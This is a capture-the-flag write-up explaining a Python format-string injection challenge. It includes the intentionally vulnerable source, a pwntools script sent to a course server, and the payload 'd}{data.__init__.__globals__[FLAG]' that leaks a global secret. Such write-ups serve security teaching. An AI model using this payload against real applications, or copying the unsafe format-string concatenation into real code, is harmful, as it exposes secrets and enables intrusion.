---
title:  "Writeup: slither"
date:   2020-05-11 9:00:00
categories: writeup
layout: post
author: Alexander Rus
---

The challenge requires us to exploit vulnerability in the `str.format()` function. This is a particularly powerful vulnerability as it allows one to access attributes of objects in the program. The python source code is shown below.

```c
#!/usr/bin/python3
import random

FLAG = open("flag.txt", "r").read() 


class PythonStore:
    def __init__(self):
        self.data = random.randint(0, 256)


user_input = input('''
Welcome to the Plentiful Pythons! 
We have numerous pythons for sale.
How would you like to view the count of pythons we have?
''')

if user_input == "":
    user_input = "d"

format_str = "We have {data.data:" + user_input + "} pythons! Bye!"

print(format_str.format(data=PythonStore()))
```

Looking at the code, we can see that our goal is to read the contents of the `FLAG` variable. Though this variable may appear disjointed from the rest of the program, we can access it given the correct vulnerability. Now, we can see that in our class definition of `PythonStore`, when initializing an object, we set the variable data to be a random integer. After that, the user is prompted with an input asking them if they would like to 'view the count of pythons we have'. If the user input is blank or `d`, we then set it to `d`, and we format a message: "We have {data.data:" + user_input + "} pythons! Bye!". We then print our formatted string. 

If we examine the line `format_str = "We have {data.data:" + user_input + "} pythons! Bye!"`, and the `user_input` is set to `""`, then the contents of `format_str` will be `"We have {data.data:d} pythons! Bye!"`. If we put our exploit in a python file, such a file may look as such:        

```c
from pwn import *

r = remote("cs4401shell2.walls.ninja", 44675)

payload1 = ""
r.sendline(payload1)
print(r.recv())

payload2 = ""
r.sendline(payload2)
print(r.recv())
```

The reason this exploit has two payloads, is in order to keep the connection to the port open and print out the message. The return message from the exploit appears as
 
```c
Welcome to the Plentiful Pythons! 
We have numerous pythons for sale.
How would you like to view the count of pythons we have?

We have 125 pythons! Bye!
```
By placing a `d` in the placeholder `{data.data:d}`, we are specifically printing the decimal (thats the `d`) form of the data variable in the data object. In this form the program prints the random integer that is generated. By exploiting the `format()` method, we should be able to print the `FLAG` instead of the random integer.

Luckily for us, `FLAG` is global, and therefore is stored in the the `__globals__` dictionary, an attribute of Python object methods. Because `PythonStore` will create an object, that object has access to `FLAG`, and it can be accessed with the string: `data.__init__.__globals__[FLAG]`. And so in order to print this value we will trick our program into printing the flag by sneeking in two format clauses. We can accomplish this with an exploit formatted as such:

```c
from pwn import *

r = remote("cs4401shell2.walls.ninja", 44675)

payload1 = "d}{data.__init__.__globals__[FLAG]"
r.sendline(payload1)
print(r.recv())

payload2 = ""
r.sendline(payload2)
print(r.recv())
```

This will give us our output:

```c
Welcome to the Plentiful Pythons! 
We have numerous pythons for sale.
How would you like to view the count of pythons we have?

We have 15451304b979b77c7e0daef93c6eef30af0
 pythons! Bye!
```